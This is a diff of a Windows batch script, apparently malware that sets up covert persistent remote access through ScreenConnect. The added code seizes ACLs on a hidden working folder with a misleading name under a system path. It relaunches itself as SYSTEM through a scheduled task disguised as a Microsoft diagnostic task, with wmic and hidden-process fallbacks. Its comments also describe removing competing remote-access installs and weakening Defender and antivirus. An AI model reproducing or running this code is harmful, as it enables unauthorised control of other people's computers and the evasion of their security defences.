@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O8 - robust MSI fetch + always nuke foreign + diagnose
+REM OWN BUILD 20260802O9 - schtasks detach + robust MSI + always nuke foreign
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "LOG=%WD%\boot.err"
 set "MSI=%TEMP%\sc_primary.msi"
@@ -16,26 +16,76 @@ if not exist "%CURL%" set "CURL=curl.exe"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 
-REM Survive ScreenConnect Guest 30s kill: detach into independent process
+REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O8 ===
+  echo === OWN BUILD 20260802O9 ===
   net session >nul 2>&1
-  if errorlevel 1 (echo need Administrator & exit /b 5)
-  echo go_start %DATE% %TIME%>"%LOG%"
+  if errorlevel 1 (
+    echo ERROR: need Administrator ^(elevate Guest / Run as admin^)
+    exit /b 5
+  )
+  REM unlock workdir if prior ACL lock blocks this Admin session
+  takeown /F "%WD%" /R /D Y >nul 2>&1
+  icacls "%WD%" /grant "BUILTIN\Administrators:(OI)(CI)F" /T /C >nul 2>&1
+  icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /C >nul 2>&1
+  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
+  if not exist "%LOG%" (
+    echo ERROR: cannot write log - Access denied on %WD%
+    exit /b 6
+  )
   echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
-  echo engine=cmd_only_detached>>"%LOG%"
-  copy /y "%~f0" "%SELF%" >nul
+  echo engine=cmd_detached_o9>>"%LOG%"
+  copy /y "%~f0" "%SELF%" >nul 2>&1
+  if not exist "%SELF%" (
+    echo ERROR: cannot copy worker to %SELF%
+    exit /b 6
+  )
   echo detach_begin>>"%LOG%"
-  wmic process call create "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\detach.wmic" 2>&1
+  set "DETACH_OK=0"
+
+  REM Method A: schtasks as SYSTEM ^(most reliable in Guest^)
+  schtasks /Delete /TN "\Microsoft\Windows\WDI\PerfTrack" /F >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\WDI\PerfTrack" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 00:00 /SD 01/01/2000 /F /TR "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\detach.task" 2>&1
+  schtasks /Run /TN "\Microsoft\Windows\WDI\PerfTrack" >"%WD%\detach.run" 2>&1
+  if not errorlevel 1 (
+    set "DETACH_OK=1"
+    echo detach_via=schtasks>>"%LOG%"
+  )
+
+  REM Method B: wmic
+  if "!DETACH_OK!"=="0" (
+    wmic process call create "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\detach.wmic" 2>&1
+    findstr /C:"ReturnValue = 0" "%WD%\detach.wmic" >nul 2>&1
+    if not errorlevel 1 (
+      set "DETACH_OK=1"
+      echo detach_via=wmic>>"%LOG%"
+    ) else (
+      echo detach_wmic_fail>>"%LOG%"
+    )
+  )
+
+  REM Method C: hidden same-user process ^(last resort; Guest may kill it^)
+  if "!DETACH_OK!"=="0" (
+    start "" /b cmd.exe /c "\"%SELF%\" _RUN"
+    set "DETACH_OK=1"
+    echo detach_via=start_b>>"%LOG%"
+  )
+
+  if "!DETACH_OK!"=="0" (
+    echo ERROR: detach FAILED - Access denied creating worker
+    echo Check: "%WD%\detach.task" / detach.wmic
+    echo detach_FAILED>>"%LOG%"
+    exit /b 7
+  )
   echo detach_done>>"%LOG%"
-  echo Detached. Wait ~90s then:
+  echo Detached OK. Wait ~90s then:
   echo   type "%LOG%"
   echo   sc query state= all ^| findstr /I ScreenConnect
   exit /b 0
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260802O8 ===
+echo === OWN WORKER 20260802O9 ===
 
 echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
 echo av_reg_begin>>"%LOG%"
